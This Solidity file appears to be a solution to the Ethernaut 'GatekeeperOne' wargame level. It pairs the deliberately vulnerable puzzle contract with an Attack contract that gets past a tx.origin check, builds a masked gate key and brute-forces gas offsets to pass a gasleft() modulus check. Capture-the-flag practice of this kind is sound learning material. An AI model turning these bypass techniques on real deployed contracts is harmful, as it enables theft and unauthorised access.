// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    GatekeeperOne gatekeeperOne;

    event SuccessOn(uint256 n);

    constructor(GatekeeperOne _gatekeeperOne) {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        for (uint i = 16635;i < 16700;i++) {
            (bool success, ) = address(gatekeeperOne).call{gas: 8191 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(success) {
                emit SuccessOn(i);
                return;
            }
        }
    }
}